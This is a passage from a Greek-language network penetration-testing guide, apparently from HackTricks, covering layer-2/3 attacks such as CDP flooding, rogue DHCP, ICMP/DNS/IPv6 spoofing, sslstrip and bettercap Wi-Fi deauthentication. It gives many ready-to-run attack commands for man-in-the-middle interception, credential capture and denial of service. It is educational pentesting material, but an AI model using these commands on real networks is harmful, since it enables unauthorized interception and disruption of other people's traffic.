Κατά τη διάρκεια αυτής της επίθεσης, η CPU του switch και ο CDP neighbor table επιβαρύνονται σημαντικά, οδηγώντας σε αυτό που συχνά αναφέρεται ως **“παράλυση δικτύου”** λόγω της υπερβολικής κατανάλωσης πόρων.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Επιθέσεις VoIP και το εργαλείο VoIP Hopper

Τα VoIP τηλέφωνα, που ολοένα και περισσότερο ενσωματώνονται με συσκευές IoT, παρέχουν λειτουργίες όπως το ξεκλείδωμα θυρών ή ο έλεγχος θερμοστατών μέσω ειδικών τηλεφωνικών αριθμών. Ωστόσο, αυτή η ενσωμάτωση μπορεί να δημιουργήσει κινδύνους ασφάλειας.

Το εργαλείο [**voiphopper**](http://voiphopper.sourceforge.net) έχει σχεδιαστεί για να μιμείται ένα VoIP τηλέφωνο σε διάφορα περιβάλλοντα (Cisco, Avaya, Nortel, Alcatel-Lucent). Εντοπίζει το VLAN ID του voice δικτύου χρησιμοποιώντας πρωτόκολλα όπως CDP, DHCP, LLDP-MED και 802.1Q ARP.

**VoIP Hopper** προσφέρει τρεις λειτουργίες για το Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Αναλύει πακέτα δικτύου για να εντοπίσει το VLAN ID.
2. **Spoof Mode** (`-c 1`): Δημιουργεί προσαρμοσμένα πακέτα που μιμούνται αυτά μιας πραγματικής VoIP συσκευής.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Στέλνει πακέτα πανομοιότυπα με αυτά ενός συγκεκριμένου μοντέλου Cisco IP phone.

Η προτιμώμενη λειτουργία για ταχύτητα είναι η τρίτη. Απαιτεί να καθορίσετε:

- Το network interface του επιτιθέμενου (`-i` parameter).
- Το όνομα της VoIP συσκευής που μιμείστε (`-E` parameter), σύμφωνα με τη μορφή ονομασίας της Cisco (π.χ. SEP ακολουθούμενο από MAC address).

Σε εταιρικά περιβάλλοντα, για να μιμηθείτε υπάρχουσα VoIP συσκευή, μπορείτε να:

- Ελέγξετε την ετικέτα MAC στο τηλέφωνο.
- Πλοηγηθείτε στις ρυθμίσεις οθόνης του τηλεφώνου για να δείτε πληροφορίες μοντέλου.
- Συνδέσετε τη VoIP συσκευή σε φορητό υπολογιστή και παρατηρήσετε τα CDP requests χρησιμοποιώντας Wireshark.

Ένα παράδειγμα εντολής για να εκτελέσετε το εργαλείο στην τρίτη λειτουργία θα ήταν:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Επιθέσεις

#### Καταγραφή
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** μπορούν να πραγματοποιηθούν εναντίον των DHCP servers. Ο πρώτος αφορά το να **προσομοιώσετε αρκετούς ψεύτικους hosts ώστε να εξαντληθούν όλες οι πιθανές διευθύνσεις IP**.\
Αυτή η επίθεση θα λειτουργήσει μόνο εάν μπορείτε να δείτε τις απαντήσεις του DHCP server και να ολοκληρώσετε το πρωτόκολλο (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Για παράδειγμα, αυτό **δεν είναι δυνατό σε Wifi networks**.

Ένας άλλος τρόπος για να πραγματοποιηθεί DHCP DoS είναι να σταλεί ένα **DHCP-RELEASE packet using as source code every possible IP**. Τότε, ο server θα νομίσει ότι όλοι έχουν τελειώσει με τη χρήση της IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Ένας πιο αυτόματος τρόπος για να το κάνετε αυτό είναι να χρησιμοποιήσετε το εργαλείο [DHCPing](https://github.com/kamorin/DHCPig)

Μπορείτε να χρησιμοποιήσετε τις αναφερόμενες DoS επιθέσεις για να αναγκάσετε τους clients να λάβουν νέα leases μέσα στο περιβάλλον και να εξαντλήσετε τους νόμιμους servers ώστε να γίνουν μη αποκρίσιμοι. Έτσι, όταν οι νόμιμοι προσπαθήσουν να επανασυνδεθούν, **μπορείτε να παρέχετε κακόβουλες τιμές που αναφέρονται στην επόμενη επίθεση**.

#### Ορισμός κακόβουλων τιμών

Ένας rogue DHCP server μπορεί να στηθεί χρησιμοποιώντας το DHCP script που βρίσκεται στο `/usr/share/responder/DHCP.py`. Αυτό είναι χρήσιμο για network attacks, όπως η καταγραφή HTTP traffic και credentials, ανακατευθύνοντας την κίνηση σε έναν malicious server. Ωστόσο, η ρύθμιση ενός rogue gateway είναι λιγότερο αποτελεσματική καθώς επιτρέπει μόνο την καταγραφή εξερχόμενης κίνησης από τον client, χάνοντας τις απαντήσεις από το πραγματικό gateway. Αντίθετα, συνιστάται η εγκατάσταση ενός rogue DNS ή WPAD server για πιο αποτελεσματική επίθεση.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Χρησιμοποιήστε `-i 10.0.0.100` για να διαφημίσετε τη διεύθυνση IP του μηχανήματός σας ως gateway.
- **Local DNS Domain Name**: Προαιρετικά, χρησιμοποιήστε `-d example.org` για να ορίσετε ένα τοπικό DNS domain name.
- **Original Router/Gateway IP**: Χρησιμοποιήστε `-r 10.0.0.1` για να καθορίσετε τη διεύθυνση IP του νόμιμου router ή gateway.
- **Primary DNS Server IP**: Χρησιμοποιήστε `-p 10.0.0.100` για να ορίσετε τη διεύθυνση IP του rogue DNS server που ελέγχετε.
- **Secondary DNS Server IP**: Προαιρετικά, χρησιμοποιήστε `-s 10.0.0.1` για να ορίσετε μια secondary DNS server IP.
- **Netmask of Local Network**: Χρησιμοποιήστε `-n 255.255.255.0` για να ορίσετε το netmask του τοπικού δικτύου.
- **Interface for DHCP Traffic**: Χρησιμοποιήστε `-I eth1` για να ακούτε DHCP traffic σε μια συγκεκριμένη network interface.
- **WPAD Configuration Address**: Χρησιμοποιήστε `-w “http://10.0.0.100/wpad.dat”` για να ορίσετε τη διεύθυνση για WPAD configuration, βοηθώντας στην υποκλοπή web traffic.
- **Spoof Default Gateway IP**: Συμπεριλάβετε `-S` για να πλαστογραφήσετε τη default gateway IP address.
- **Respond to All DHCP Requests**: Συμπεριλάβετε `-R` για να κάνετε τον server να απαντά σε όλα τα DHCP requests, αλλά λάβετε υπόψη ότι αυτό είναι θορυβώδες και μπορεί να ανιχνευθεί.

Χρησιμοποιώντας σωστά αυτές τις επιλογές, μπορεί να εγκατασταθεί ένας rogue DHCP server για να υποκλεπτεί αποτελεσματικά το network traffic.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Επιθέσεις**

Ακολουθούν μερικές τακτικές επίθεσης που μπορούν να χρησιμοποιηθούν εναντίον υλοποιήσεων 802.1X:

- Ενεργή brute-force δοκιμή κωδικού μέσω EAP
- Επίθεση στον RADIUS server με κακόμορφο EAP περιεχόμενο _\*\*_(exploits)
- Καταγραφή μηνυμάτων EAP και offline αποκωδικοποίηση κωδικού (EAP-MD5 και PEAP)
- Εξαναγκασμός της EAP-MD5 αυθεντικοποίησης για παράκαμψη της επικύρωσης πιστοποιητικού TLS
- Εισαγωγή κακόβουλης κυκλοφορίας δικτύου μετά την αυθεντικοποίηση χρησιμοποιώντας hub ή παρόμοιο

Εάν ο επιτιθέμενος βρίσκεται ανάμεσα στο θύμα και τον διακομιστή αυθεντικοποίησης, μπορεί να προσπαθήσει να υποβαθμίσει (αν χρειάζεται) το πρωτόκολλο αυθεντικοποίησης σε EAP-MD5 και να καταγράψει την προσπάθεια αυθεντικοποίησης. Έπειτα, θα μπορούσε να δοκιμάσει brute-force με χρήση:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) είναι μια κατηγορία πρωτοκόλλων δικτύου σχεδιασμένων να δημιουργούν ένα ενεργό εφεδρικό σύστημα δρομολόγησης. Με το FHRP, οι φυσικοί δρομολογητές μπορούν να συνδυαστούν σε μία λογική συσκευή, κάτι που αυξάνει την αντοχή σε σφάλματα και βοηθά στην κατανομή του φόρτου.

**Οι μηχανικοί της Cisco Systems έχουν αναπτύξει δύο πρωτόκολλα FHRP, GLBP και HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Υπάρχουν τρεις γνωστές εκδόσεις του Routing Information Protocol (RIP): RIP, RIPv2 και RIPng. Τα datagrams αποστέλλονται σε peers μέσω της θύρας 520 χρησιμοποιώντας UDP από τα RIP και RIPv2, ενώ τα datagrams εκπέμπονται στη θύρα UDP 521 μέσω IPv6 multicast από το RIPng. Η υποστήριξη για MD5 authentication εισήχθη από το RIPv2. Αντίθετα, το RIPng δεν ενσωματώνει εγγενή authentication· αντί αυτού βασίζεται σε προαιρετικά IPsec AH και ESP headers στο IPv6.

- **RIP and RIPv2:** Η επικοινωνία γίνεται μέσω UDP datagrams στη θύρα 520.
- **RIPng:** Χρησιμοποιεί τη θύρα UDP 521 για broadcast datagrams μέσω IPv6 multicast.

Σημειώστε ότι το RIPv2 υποστηρίζει MD5 authentication ενώ το RIPng δεν περιλαμβάνει εγγενές authentication, βασιζόμενο σε IPsec AH και ESP headers στο IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** είναι ένα δυναμικό routing protocol. **Είναι ένα distance-vector protocol.** Εάν δεν υπάρχει **authentication** και ρύθμιση παθητικών διεπαφών, ένας **εισβολέας** μπορεί να παρεμποδίσει τη δρομολόγηση EIGRP και να προκαλέσει **δηλητηρίαση πινάκων δρομολόγησης**. Επιπλέον, το δίκτυο EIGRP (δηλαδή το autonomous system) **είναι επίπεδο και δεν έχει τμηματοποίηση σε ζώνες**. Εάν ένας **επιτιθέμενος εγχύσει μια διαδρομή**, είναι πιθανό αυτή η διαδρομή να **διαδοθεί** σε όλο το αυτόνομο σύστημα EIGRP.

Για να επιτεθεί κάποιος σε σύστημα EIGRP απαιτείται **η εγκαθίδρυση γειτονίας με έναν νόμιμο EIGRP router**, κάτι που ανοίγει πολλές δυνατότητες, από βασική αναγνώριση μέχρι διάφορες εγχύσεις.

[**FRRouting**](https://frrouting.org/) σας επιτρέπει να υλοποιήσετε **έναν virtual router που υποστηρίζει BGP, OSPF, EIGRP, RIP και άλλα πρωτόκολλα.** Απλώς αναπτύξτε το στο σύστημα του επιτιθέμενου και μπορείτε ουσιαστικά να προσποιηθείτε ότι είστε ένας νόμιμος δρομολογητής στο routing domain.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) έχει δυνατότητες για την υποκλοπή EIGRP broadcasts. Επιτρέπει επίσης την έγχυση πακέτων, τα οποία μπορούν να χρησιμοποιηθούν για την τροποποίηση των ρυθμίσεων δρομολόγησης.

### OSPF

Στο πρωτόκολλο Open Shortest Path First (OSPF) η MD5 authentication χρησιμοποιείται συνήθως για να εξασφαλίσει ασφαλή επικοινωνία μεταξύ δρομολογητών. Ωστόσο, αυτό το μέτρο ασφάλειας μπορεί να παραβιαστεί χρησιμοποιώντας εργαλεία όπως τα Loki και John the Ripper. Αυτά τα εργαλεία μπορούν να καταγράψουν και να σπάσουν MD5 hashes, αποκαλύπτοντας το authentication key. Μόλις αποκτηθεί αυτό το key, μπορεί να χρησιμοποιηθεί για να εισάγει νέα πληροφορία δρομολόγησης. Για τη ρύθμιση των παραμέτρων διαδρομής και την καθιέρωση του συμβιβασμένου key χρησιμοποιούνται οι καρτέλες _Injection_ και _Connection_ αντίστοιχα.

- **Καταγραφή και σπάσιμο MD5 hashes:** Χρησιμοποιούνται εργαλεία όπως τα Loki και John the Ripper.
- **Ρύθμιση παραμέτρων διαδρομής:** Γίνεται μέσω της καρτέλας _Injection_.
- **Ορισμός του συμβιβασμένου key:** Το key ρυθμίζεται στην καρτέλα _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Εργαλείο για σάρωση της κυκλοφορίας δικτύου και εντοπισμό ευπαθειών
- Μπορείτε να βρείτε περισσότερες πληροφορίες για **επιθέσεις δικτύου** [**εδώ**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Ο επιτιθέμενος ρυθμίζει όλες τις παραμέτρους δικτύου (GW, IP, DNS) του νέου μέλους του δικτύου στέλνοντας ψεύτικες απαντήσεις DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Δείτε την [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect συνίσταται στην αποστολή ενός ICMP packet type 1 code 5 που υποδεικνύει ότι ο attacker είναι ο καλύτερος δρόμος για να προσεγγιστεί ένα IP. Στη συνέχεια, όταν ο victim θέλει να επικοινωνήσει με το IP, θα στείλει το πακέτο μέσω του attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Ο attacker θα επιλύσει μερικά (ή όλα) από τα domains που ζητά το victim.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Ρύθμιση δικού DNS με dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Τοπικές Πύλες

Συχνά υπάρχουν πολλαπλές διαδρομές προς συστήματα και δίκτυα. Μετά τη δημιουργία λίστας MAC addresses εντός του τοπικού δικτύου, χρησιμοποιήστε _gateway-finder.py_ για να εντοπίσετε hosts που υποστηρίζουν IPv4 forwarding.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Για την τοπική επίλυση ονομάτων όταν οι αναζητήσεις DNS αποτυγχάνουν, τα συστήματα Microsoft βασίζονται σε **Link-Local Multicast Name Resolution (LLMNR)** και στην **NetBIOS Name Service (NBT-NS)**. Ομοίως, οι υλοποιήσεις **Apple Bonjour** και **Linux zero-configuration** χρησιμοποιούν **Multicast DNS (mDNS)** για τον εντοπισμό συστημάτων στο δίκτυο. Εξαιτίας της μη-επαληθευμένης φύσης αυτών των πρωτοκόλλων και της λειτουργίας τους πάνω σε UDP, με μετάδοση μηνυμάτων (broadcast), μπορούν να εκμεταλλευτούν επιτιθέμενοι που στοχεύουν στην ανακατεύθυνση χρηστών σε κακόβουλες υπηρεσίες.

Μπορείτε να προσποιηθείτε υπηρεσίες που αναζητούν οι hosts χρησιμοποιώντας το Responder για να στείλετε ψευδείς απαντήσεις.\
Διαβάστε εδώ περισσότερες πληροφορίες για [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Οι περιηγητές συνήθως χρησιμοποιούν το πρωτόκολλο **Web Proxy Auto-Discovery (WPAD)** για να αποκτούν αυτόματα ρυθμίσεις proxy. Αυτό περιλαμβάνει την ανάκτηση λεπτομερειών ρύθμισης από έναν διακομιστή, συγκεκριμένα μέσω ενός URL όπως "http://wpad.example.org/wpad.dat". Η ανακάλυψη αυτού του διακομιστή από τους clients μπορεί να γίνει μέσω διαφόρων μηχανισμών:

- Μέσω **DHCP**, όπου η ανακάλυψη διευκολύνεται με τη χρήση μιας ειδικής καταχώρησης κωδικού 252.
- Μέσω **DNS**, που περιλαμβάνει την αναζήτηση ενός hostname με την ετικέτα _wpad_ εντός του τοπικού domain.
- Μέσω **Microsoft LLMNR and NBT-NS**, που είναι μηχανισμοί fallback χρησιμοποιούμενοι όταν οι αναζητήσεις DNS δεν πετυχαίνουν.

Το εργαλείο Responder εκμεταλλεύεται αυτό το πρωτόκολλο ενεργώντας ως **malicious WPAD server**. Χρησιμοποιεί DHCP, DNS, LLMNR, και NBT-NS για να εξαπατήσει τους clients ώστε να συνδεθούν σε αυτό. Για να εμβαθύνετε στο πώς μπορούν να προσποιηθούν υπηρεσίες χρησιμοποιώντας το Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Μπορείτε να προσφέρετε διαφορετικές υπηρεσίες στο δίκτυο για να προσπαθήσετε να **trick a user** ώστε να εισάγει κάποιες **plain-text credentials**. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Αυτή η επίθεση είναι πολύ παρόμοια με το ARP Spoofing αλλά στον κόσμο του IPv6. Μπορείτε να κάνετε το θύμα να πιστέψει ότι η διεύθυνση IPv6 της GW έχει το MAC του επιτιθέμενου.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Ορισμένα OS ρυθμίζουν από προεπιλογή την προεπιλεγμένη πύλη από τα πακέτα RA που αποστέλλονται στο δίκτυο. Για να δηλώσετε τον επιτιθέμενο ως IPv6 router μπορείτε να χρησιμοποιήσετε:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Από προεπιλογή, ορισμένα OS προσπαθούν να ρυθμίσουν το DNS διαβάζοντας ένα DHCPv6 πακέτο στο δίκτυο. Έτσι, ένας attacker θα μπορούσε να στείλει ένα DHCPv6 πακέτο για να ρυθμίσει τον εαυτό του ως DNS. Το DHCP επίσης παρέχει ένα IPv6 στο θύμα.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (ψεύτικη σελίδα και JS code injection)

## Επιθέσεις στο Διαδίκτυο

### sslStrip

Βασικά, αυτό που κάνει αυτή η επίθεση είναι ότι, σε περίπτωση που ο **χρήστης** προσπαθήσει να **έχει πρόσβαση** σε μια **HTTP** σελίδα που **ανακατευθύνει** στην έκδοση **HTTPS**, η **sslStrip** θα **διατηρήσει** μια **HTTP connection with** τον **client** και μια **HTTPS connection with** τον **server**, ώστε να μπορέσει να **sniff** τη σύνδεση σε **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy for bypassing HSTS

The **difference** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **redirect** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**. This way, the **client** will **connect** to _**wwww.facebook.com**_ **(the attacker)** but behind the scenes **sslstrip+** will **maintain** the **real connection** via https with **www.facebook.com**.

Ο **στόχος** αυτής της τεχνικής είναι να **αποφύγει το HSTS** επειδή _**wwww**.facebook.com_ **δεν θα** αποθηκευτεί στην **cache** του **browser**, οπότε ο **browser** θα εξαπατηθεί να εκτελέσει **facebook authentication in HTTP**.\
Σημειώστε ότι για να πραγματοποιηθεί αυτή η επίθεση το θύμα πρέπει αρχικά να προσπαθήσει να αποκτήσει πρόσβαση στο [http://www.faceook.com](http://www.faceook.com) και όχι μέσω https. Αυτό μπορεί να γίνει τροποποιώντας τους συνδέσμους μέσα σε μια http σελίδα.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn;t work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP ακρόαση σε θύρα
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL listen σε port

#### Δημιουργία κλειδιών και αυτο-υπογεγραμμένου πιστοποιητικού
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ακρόαση με πιστοποιητικό
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ακούστε χρησιμοποιώντας πιστοποιητικό και ανακατεύθυνση προς hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Κάποιες φορές, αν ο client ελέγχει ότι η CA είναι έγκυρη, μπορείτε να **serve a certificate of other hostname signed by a CA**.\
Μια άλλη ενδιαφέρουσα δοκιμή είναι να serve a c**ertificate of the requested hostname but self-signed**.

Άλλα πράγματα που μπορούμε να δοκιμάσουμε είναι να προσπαθήσουμε να υπογράψουμε το certificate με ένα έγκυρο certificate που όμως δεν είναι έγκυρη CA. Ή να χρησιμοποιήσουμε το έγκυρο public key, να επιβάλουμε τη χρήση ενός algorithm όπως diffie hellman (ένα που δεν χρειάζεται να αποκρυπτογραφήσει τίποτα με το πραγματικό private key) και όταν ο client ζητήσει ένα probe του πραγματικού private key (όπως ένα hash) να στείλουμε ένα ψεύτικο probe και να αναμένουμε ότι ο client δεν θα το ελέγξει.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

Λάβετε υπόψη ότι όταν ένα πακέτο UDP αποστέλλεται σε μια συσκευή που δεν έχει την ζητούμενη θύρα, αποστέλλεται ένα μήνυμα ICMP (Port Unreachable).

### **ARP discover**

Τα πακέτα ARP χρησιμοποιούνται για να εντοπίσουν ποιες IP χρησιμοποιούνται μέσα στο δίκτυο. Ο υπολογιστής πρέπει να στείλει ένα αίτημα για κάθε πιθανή διεύθυνση IP και μόνο αυτές που είναι σε χρήση θα απαντήσουν.

### **mDNS (multicast DNS)**

Το Bettercap στέλνει ένα mDNS αίτημα (κάθε X ms) ζητώντας το **\_services\_.dns-sd.\_udp.local**. Η μηχανή που βλέπει αυτό το πακέτο συνήθως απαντά σε αυτό το αίτημα. Έπειτα, ψάχνει μόνο για μηχανές που απαντούν σε "services".

**Εργαλεία**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Το Bettercap εκπέμπει πακέτα στη θύρα 137/UDP ζητώντας για το όνομα "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Το Bettercap εκπέμπει πακέτα SSDP ψάχνοντας για κάθε είδους υπηρεσίες (UDP Port 1900).

### **WSD (Web Service Discovery)**

Το Bettercap εκπέμπει πακέτα WSD ψάχνοντας για υπηρεσίες (UDP Port 3702).


### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Αναφορές

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
